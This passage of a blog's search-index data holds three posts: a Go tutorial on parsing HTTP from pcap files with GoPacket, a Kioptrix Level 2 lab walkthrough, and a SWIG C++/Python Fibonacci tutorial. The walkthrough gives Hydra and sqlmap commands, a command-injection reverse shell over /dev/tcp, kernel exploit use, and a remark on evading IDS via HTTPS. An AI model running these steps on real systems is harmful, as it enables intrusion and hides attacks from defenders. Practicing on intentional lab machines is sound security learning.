packet.def 8) Copy libwpcap.a and libpacket.a to c:\\WpdPack\\Lib\\x64 9) Lastly Install gopacket \u0026amp; pcap via. --\u0026gt; go get github.com/google/gopacket --\u0026gt; go get github.com/google/gopacket/pcap 10) Let the fun begin! Go\nThe first step is simply getting a pcap file, you can do this by taking a packet capture with either tcpdump on windows or Wireshark. I used wireshark and took a packet capture of some HTTP requests targetted at the berkley packet filter website, http://biot.com/capstats/bpf.html\nOpening the file and processing the pcap file for packets.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) var ( pcapFile string = \u0026#34;capture.pcap\u0026#34; handle *pcap.Handle err error ) func main() { // Open file instead of device \thandle, err = pcap.OpenOffline(pcapFile) if err != nil { log.Fatal(err) } defer handle.Close() // Loop through packets in file \tpacketSource := gopacket.NewPacketSource(handle, handle.LinkType()) for packet := range packetSource.Packets() { fmt.Println(packet) } }   The above code simply reads the file and prints the packets out with their layers to the console, however in this case we want to look for a specific protocol, say HTTP. Modifying the code we add a BPFF filter for TCP port 80 (typically HTTP traffic) and a destination that I know will receive my web traffic.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) var ( pcapFile string = \u0026#34;capture.pcap\u0026#34; handle *pcap.Handle err error ) func main() { // Open file instead of device \thandle, err = pcap.OpenOffline(pcapFile) if err != nil { log.Fatal(err) } defer handle.Close() // Set filter \tvar filter string = \u0026#34;host 88.99.24.79 and port 80\u0026#34; err = handle.SetBPFFilter(filter) if err != nil { log.Fatal(err) } fmt.Println(\u0026#34;Filter set to Port 80 only!\u0026#34;) // Loop through packets in file \tpacketSource := gopacket.NewPacketSource(handle, handle.LinkType()) for packet := range packetSource.Packets() { fmt.Println(packet) } }   After setting our filter to catch only port 80 traffic, we want to actually inspect the payload data of each HTTP packet. For this we need to peel open additional iplayers in the packet. \u0026ldquo;github.com/google/gopacket/layers\u0026rdquo;\nWe add the line(s):\n1 2  ipLayer := packet.Layer(layers.LayerTypeIPv4) fmt.Printf(\u0026#34;%+v\u0026#34;, ipLayer)   Output:\nFilter set to Port 80 only! \u0026amp;{BaseLayer:{Contents:[69 0 2 32 75 114 64 0 128 6 0 0 192 168 1 38 88 99 24 79] Payload:[203 52 32 77 97 114 32 50 48 48 57 32 49 57 58 52 48 58 53 53 32 71 77 84 13 10 13 10]} Version:4 IHL:5 TOS:0 Length:544 Id:19314 Flags:DF FragOffset:0 TTL:128 Protocol:TCP Checksum:0 SrcIP:192.168.1.38 DstIP:88.99.24.79 Options:[] Padding:[]} Process finished with exit code 0 We need to extract the Payload data of each packet. In order to handle this data we must\nknow what object is being passed back to us. Checking this reveals an interface.\n1 2  fmt.Printf(\u0026#34;%t\u0026#34;, ipLayer) type: *layers.IPv4   In order to handle this interface and get the payload it needs to be Casted to type interface. The line we added from before changes to.\n1 2 3  ipLayer := packet.Layer(layers.LayerTypeIPv4) ip, _ := ipLayer.(*layers.IPv4) fmt.Println(string(ip.Payload))   Output -\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  Filter set to Port 80 only! �\u0012 P\u0012Mq��ߘP\u0018 �4� GET /capstats/bpf.html HTTP/1.1 Host: biot.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: W/\u0026#34;49bc0847-6b3b\u0026#34; If-Modified-Since: Sat, 14 Mar 2009 19:40:55 GMT P�\u0012��ߘ\u0012Ms�P\u0018 �av HTTP/1.1 304 Not Modified Server: nginx Date: Sat, 25 Aug 2018 18:38:12 GMT Last-Modified: Sat, 14 Mar 2009 19:40:55 GMT Connection: keep-alive ETag: \u0026#34;49bc0847-6b3b\u0026#34; �\u0012 P\u0012Msڙ��FP\u0010 �2� �\u0011 P��I\u0004��P\u0011\u0001 2� �\u0012 P\u0012Msڙ��FP\u0018 �4� GET /capstats/bpf.html HTTP/1.1 Host: biot.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: W/\u0026#34;49bc0847-6b3b\u0026#34; If-Modified-Since: Sat, 14 Mar 2009 19:40:55 GMT �\u0016 P�\u0014�� �\u0002��2� \u0002\u0004\u0005�\u0001\u0003\u0001\u0001\u0004\u0002 P�\u0011����I\u0005P\u0011 �\u0016� �\u0011 P��I\u0005��P\u0010\u0001 2� P�\u0016\u0002\u001eY��\u0014��\u0012r\u0010�: \u0002\u0004\u0005�\u0001\u0001\u0004\u0002\u0001\u0003\u0003\u0007 �\u0016 P�\u0014��\u0002\u001eY�P\u0010\u0001 2� P�\u0012���F\u0012Mu�P\u0018 �Z� HTTP/1.1 304 Not Modified Server: nginx Date: Sat, 25 Aug 2018 18:38:16 GMT Last-Modified: Sat, 14 Mar 2009 19:40:55 GMT Connection: keep-alive ETag: \u0026#34;49bc0847-6b3b\u0026#34; �\u0012 P\u0012Muҙ���P\u0010 �2� Process finished with exit code 0   You can see there are some interesting characters @ the start of each payload. This is padding, and those bytes can be removed.\nI confirmed with a packet capture software tool (such as wireshark) that the data is nearly identical (minus the padding).\nPacket Analysis on Wireshark\nNice that we are getting some Raw HTTP data back we can start inspecting this data to start analyzing patterns to create a detection engine.\nWe need to implement a way to remove some of the TCP padding that is showing up within the data payload (�). It was found that these are typically padded around 20 bytes.\nWe can slice the payload by 20 bytes to get rid of most of the non readable characters.\n1  fmt.Println(string(ip.Payload[20:]))   Unfortunatley for us, the last HTTP reponse (304) is over 21 bytes long. Since we are capturing all protocol data we are actually getting both TCP and HTTP payload data mixed in our dataset.\nAs discussed later in the post, we will need to be able to filter out some of this unecessary encoded data since we are not interested in it. TCP in the sense of our target application (the HTTP web server) is pureley the underlay component of the protocol, e.g. it allows us to maintain an established and reliable connection via TCP, the actual content data, is actually built ontop of TCP via the Hypertext Transfer Protocol (HTTP) which is responsible for initiating the communication necessary to the web server in order to begin a data transaction.\nResults:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  Filter set to Port 80 only! GET /capstats/bpf.html HTTP/1.1 Host: biot.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: W/\u0026#34;49bc0847-6b3b\u0026#34; If-Modified-Since: Sat, 14 Mar 2009 19:40:55 GMT HTTP/1.1 304 Not Modified Server: nginx Date: Sat, 25 Aug 2018 18:38:12 GMT Last-Modified: Sat, 14 Mar 2009 19:40:55 GMT Connection: keep-alive ETag: \u0026#34;49bc0847-6b3b\u0026#34; GET /capstats/bpf.html HTTP/1.1 Host: biot.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: W/\u0026#34;49bc0847-6b3b\u0026#34; If-Modified-Since: Sat, 14 Mar 2009 19:40:55 GMT \u0002\u0004\u0005�\u0001\u0003\u0001\u0001\u0004\u0002 \u0002\u0004\u0005�\u0001\u0001\u0004\u0002\u0001\u0003\u0003\u0007 HTTP/1.1 304 Not Modified Server: nginx Date: Sat, 25 Aug 2018 18:38:16 GMT Last-Modified: Sat, 14 Mar 2009 19:40:55 GMT Connection: keep-alive ETag: \u0026#34;49bc0847-6b3b\u0026#34;   You will notice we don\u0026rsquo;t actually get any Payload  data back from the Server. I visited the web page before I ran the packet capture. Notice the HTTP Header in the request: If-None-Match: W/\u0026ldquo;49bc0847-6b3b\u0026rdquo;, On the Response we get a HTTP 304 response code indicating the file has not changed \u0026ldquo;bpf.html\u0026rdquo; and the ETAG value returned is the same (ignore the W/ it\u0026rsquo;s just an ETag option specification).\nSo effectivley the browser cached the HTTP response. Clearing my browsing data will reveal the full payload when I make the initial response to the server, AKA there wont be an If-None-Match header in the GET request.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  GET /capstats/bpf.html HTTP/1.1 Host: yawp.biot.com Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 HTTP/1.1 200 OK Server: nginx Date: Sun, 26 Aug 2018 00:48:55 GMT Content-Type: text/html Last-Modified: Sat, 14 Mar 2009 19:40:55 GMT Transfer-Encoding: chunked Connection: keep-alive Vary: Accept-Encoding ETag: W/\u0026#34;49bc0847-6b3b\u0026#34; Content-Encoding: gzip 1f66 \u0016�0\u0015qs\u0002�\u001d�R\u0013�\u0002�y��j򮍏��w��@VH�\u0013}\u000f�멢 g�F]��.\u0010g��/_�,�6���:���N�zQV0�\u0026lt;�LP\u0015\u0013��Muz\u000f�\u0026#34;s\u0013�� L�@\u0019\u0026#34; k��\u000c��\u000f\u0026#34;\u001a�㬲\u001c\u0012�eU��f7ԩ\u001a\u001bE��\u000c֓\u001d�\u0002\u0026amp;+�����\u0026#34;��l���� +M��u\tԣP�rC}�,�\u0015(�W$\u000fo\u0010S���R0���~*�/�`��x���_? ����7�\u0026#34;\u0013�tx��E�iU�h�\u0016�\u0026lt;\u0001\u0003pM\u0001\u0003\u0010,Y{�\u0010����;�U��}SW\u0003\u00107b�\u0026#39;p (��҉\u0017(��+��,�:\u001a���\u000b͂�,�%.\u001d� �J�T\u0026#39;��t�\u0016�u�\u0002\u001b4��6(�l�^� �{ w�-p���G\u0010���9��\u000b`�\u0017��m�@�%/$��\u0014�\u0026#34;\u0014}����\u0002WZ4EF�2\u0005o   There we go! After clearing our browsing history we get the raw payload back, although it still looks messy.. As you can see clearly from the HTTP headers, they indicate that the content has been encoded.\nVary: Accept-Encoding Content-Encoding: gzip In order to decode the Payload data we need to unpack it, when the data is transfered it is compressed/encoded into the gzip format. To build a decoding system we need to inspect the HTTP headers to use as a means to logically apply the correct decoding methods.\n1 2 3  Content-Type: text/html Transfer-Encoding: chunked Content-Encoding: gzip   This is purely just to explain how the HTTP response sends data. From a Client side perspective, we are not that interested in the response data from the HTTP server because it is simply doing what the Client \u0026ldquo;requests.\u0026rdquo; We would only need to inspect Client Side / Compressed HTTP data if we were interested in preventing Client Side attacks as well as preventing command and control traffic from being transmitted within the HTTP Response data.\nSo, without further-ado since we now have all the HTTP metadata we need, we can implement a more efficient decoder and begin analyzing the HTTP GET, POST, \u0026amp; PUT requests that are being sent from the client to the server.\nFor this we will implement a more efficient decoder that can unwrap the layers we need to remove some of the TCP noise showing up in-between some of our HTTP payload data (even after removing the 20 byte padding). As specified, by the library developers, for faster processing it is recommended that NewDecodingLayerParser() is implemented rather than using the built-in decoder from packet.Layer(layers.LayerTypeIPv4)\n","description":"","id":6,"section":"blog","tags":null,"title":"GoPacket Analysis Pt. 1","uri":"https://twestdev.com/blog/2018-08-25-gopacketanalysispt1/"},{"content":"Kioptrix Level 2 Just a short walkthrough on Kioptrix level 2.\nStep 1: enumeration \u0026amp; information Gathering.\rPortscan results:\nPORT STATE SERVICE REASON\r22/tcp open ssh syn-ack ttl 64\r80/tcp open http syn-ack ttl 64\r111/tcp open rpcbind syn-ack ttl 64\r443/tcp open https syn-ack ttl 64\r631/tcp open ipp syn-ack ttl 64\r812/tcp open unknown syn-ack ttl 64\r3306/tcp open mysql syn-ack ttl 64\rInspecting the Web Server reveals a login page to the administrative console.\nUsing burp suite we set up a proxy to inspect the form Request paramaeters passed to the server when attempting to login.\nStep 2: Enumeration Phase.\rUsing Hydra we can begin the Brute force process, initially the parameters passed into the web form are successful, these are obviously false positives. The web server on authentication success will likely redirect the request via a 302 or 303 HTTP response code.\nUpdating the Script parameters with:\nhydra -t 4 -vV -l admin -P /usr/share/john/password.lst 192.168.1.43 http-post-form\r\u0026quot;/index.php:uname=^USER^\u0026amp;psw=^PASS^\u0026amp;btnLogin=Login:S=302\u0026quot;\rWhile trying to Brute force we can also try to see if this particular login page is vulnerable to a simple SQL injection attack. We know the backend is running mysql based on our earlier nmap scan.\nCopying the payload from Burp suite to a text file, we can use the payload parameters in a sql injection tool such as \u0026ldquo;sqlmap.\u0026rdquo;\nPayload Data -\u0026gt;\nPOST /index.php HTTP/1.1\rHost: 192.168.1.43\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rReferer: http://192.168.1.43/index.php\rConnection: close\rUpgrade-Insecure-Requests: 1\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 39\runame=admin\u0026amp;psw=password\u0026amp;btnLogin=Login\rUsing info from the above data we can begin testing for a SQL injection using the sqlmap tool mentioned earlier.\nsqlmap -u 'http://192.168.1.43/index.php' --data='uname=admin\u0026amp;psw=admin' --level=3 --risk=3`\rAt this point, it is fairly obvious how we are going to get a shell from this machine. Since once logged in we have access to a network ping tool which is directly calling an Operating System program. We can simply try to use command path injection to bypass the ping command and call our own tool that resides on the operating system.\nrunning which through the interface results in the location of python on the OS!\nStep 3: Exploitation\rWe then set up a listener on metasploit (reverse_tcp) and then we can inject the command to spawn a reverse shell.\nuse exploit/multi/handler\rset payload linux/x86/shell/reverse_tcp\rset LHOST 192.168.1.42\rset LPORT 4444\rNow injecting the command through index.php page we bypassed -\u0026gt;\n;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.42/4444 0\u0026gt;\u0026amp;1\rWe are able to spawn a reverse shell.\nNow that we have a reverse shell, all that\u0026rsquo;s left is to obtain root (privledge escalation).\nFrom an earlier scan we know that we are on CentOS, checking the Kernel version on the target reveals it is likely vulnerable to CVE-2009-2692.\nuname -r\r2.6.9-55.EL\rUsing wget we can simply query the raw exploit code from an apache server I set up on the client machine and then try to compile it on our target system through the reverse shell.\nCompilation and execution of the C code, results in successful privledge escalation due to the vulnerable kernel.\nUnfortunatley for us, all of the enumeration attempts and exploits were being recorded the entire time. The IDS/IPS system was in only in an Alert-Mode state, however it certainly must of rang some bells and whistles\u0026hellip; =)\nRunning the very same set of exploits, but on the HTTPS socket would of entirley prevented these alerts (unless there was a prescence of a WAF) and blinded the security operations center from seeing these types of requests.\nWe will dig into how we can better or even prevent attack detection in the near future.\n","description":"","id":7,"section":"blog","tags":null,"title":"Kioptrix Level 2","uri":"https://twestdev.com/blog/2018-08-12-kioptrixlvl2/"},{"content":"FibExtensionModule Writing C++ extension modules with SWIG for Python has never been so easy\u0026hellip;\nFor this module, the C++ code was compiled with Mingw64 (i686-w64-mingw32-g++)\nThe first step is installing Mingw64 and SWIG after doing so the Mingw /bin/ files (.exe) and the SWIG (.exe) files should be set to your environment variables so they can be called from the command line.\nFirst step is to actually write and debug the C++ function you want to interface with Python.\nBecause I am using approximation and not recursion I did the calculation in C++\n1 2 3 4 5 6 7 8 9  // fib.cpp #include \u0026lt;iostream\u0026gt;#include \u0026lt;cmath\u0026gt; double Fibonacci(int n) { static const double phi = (1 + sqrt(5))*0.5; double fib = (pow(phi, n) - pow(1 - phi, n)) / sqrt(5); return round(fib); }   Next we build our SWIG template file.\n/* File: fib.i */\r%module fib\r%{\rextern double Fibonacci(int n);\r%}\rextern double Fibonacci(int n);\rUsing Swig we prep our Module.\ncmd$\u0026gt; swig -c++ -python fib.i\rThis generates a fib.py file as well as a fib_wrapper.cxx (C++ file).\nNext we need to compile our C++ code (Mingw64) and then generate the phython DLL file so we can load our module.\nWe have to be sure to include the python Include header files!\ncmd$\u0026gt; i686-w64-mingw32-g++ -c fib.cpp -I C:\\Python27\\include\rThen Compile the wrapper code.\ncmd$\u0026gt; i686-w64-mingw32-g++ -c fib_wrap.cxx -I C:\\Python27\\include\rThis leaves us with two compiled O files.\nfib.o \u0026amp; fib_wrap.o\rLastly, we need to create a python DLL linker to our Compiled files in order to load the Module in python.\ncmd$\u0026gt; i686-w64-mingw32-g++ -shared -I C:\\Python27\\include -L C:\\Python27\\libs fib.o fib_wrap.o -o _fib.pyd -lpython27\rNote: If you get an error with a definition you need to browse to the location to rename the string since some of the modules get renamed to \u0026ldquo;_module\u0026rdquo; during the compilation.\nExample:\r/include/c++/cmath:1136:11: error: '::hypot' has not been declared\rusing ::hypot;\r^~~~~\ri686-w64-mingw32-g++ -c fib.cpp\rfib.cpp:4:10: fatal error: Python.h: No such file or directory\r#include \u0026lt;Python.h\u0026gt;\r^~~~~~~~~~\rcompilation terminated.\ri686-w64-mingw32-g++ -c fib.cpp -I C:\\Python27\\include\rIn file included from C:\\Python27\\include/Python.h:8:0,\rfrom fib.cpp:4:\rC:\\Python27\\include/pyconfig.h:285:15: error: 'std::_hypot' has not been declared\r#define hypot _hypot\rThis can be fixed by modifying the included file so that when the module is loaded it calls the correct name.\nIn the example above, browsing to cmath and changing the below parameters fixes the compilation error.\n#define hypot to #define _hypot\rAfter we have successfully compiled the code and created the python \u0026ldquo;pyd\u0026rdquo; DLL we are all set for loading and running our C++\nextension module.\nExample:\n1 2 3 4 5 6 7 8  # file: runme.py import fib arr = [] for i in range(0,100): arr.append(\u0026#39;{:0.3e}\u0026#39;.format(fib.Fibonacci(i))) print arr   Results from Calculation:\nC:\\Examples\\python\\fib\u0026gt;python2 runme.py\r['0.000e+00', '1.000e+00', '1.000e+00', '2.000e+00', '3.000e+00', '5.000e+00', '8.000e+00', '1.300e+01', '2.100e+01', '3.400e+01', '5.500e+01', '8.900e+01', '1.440e+02', '2.330e+02', '3.770e+02', '6.100e+02', '9.870e+02', '1.597e+03', '2.584e+03', '4.181e+03', '6.765e+03', '1.095e+04', '1.771e+04', '2.866e+04', '4.637e+04', '7.502e+04', '1.214e+05', '1.964e+05', '3.178e+05', '5.142e+05', '8.320e+05', '1.346e+06', '2.178e+06', '3.525e+06', '5.703e+06', '9.227e+06', '1.493e+07', '2.416e+07', '3.909e+07', '6.325e+07', '1.023e+08', '1.656e+08', '2.679e+08', '4.335e+08', '7.014e+08', '1.135e+09', '1.836e+09', '2.971e+09', '4.808e+09', '7.779e+09', '1.259e+10', '2.037e+10', '3.295e+10', '5.332e+10', '8.627e+10', '1.396e+11', '2.259e+11', '3.654e+11', '5.913e+11', '9.567e+11', '1.548e+12', '2.505e+12', '4.053e+12', '6.557e+12', '1.061e+13', '1.717e+13', '2.778e+13', '4.495e+13', '7.272e+13', '1.177e+14', '1.904e+14', '3.081e+14', '4.985e+14', '8.065e+14', '1.305e+15', '2.111e+15', '3.416e+15', '5.528e+15', '8.944e+15', '1.447e+16', '2.342e+16', '3.789e+16', '6.131e+16', '9.919e+16', '1.605e+17', '2.597e+17', '4.202e+17', '6.799e+17', '1.100e+18', '1.780e+18', '2.880e+18', '4.660e+18', '7.540e+18', '1.220e+19', '1.974e+19', '3.194e+19', '5.168e+19', '8.362e+19', '1.353e+20', '2.189e+20']\r","description":"","id":8,"section":"blog","tags":null,"title":"Fibbonacci Sequence Calculator.","uri":"https://twestdev.com/blog/2018-05-04-fibextension/"}]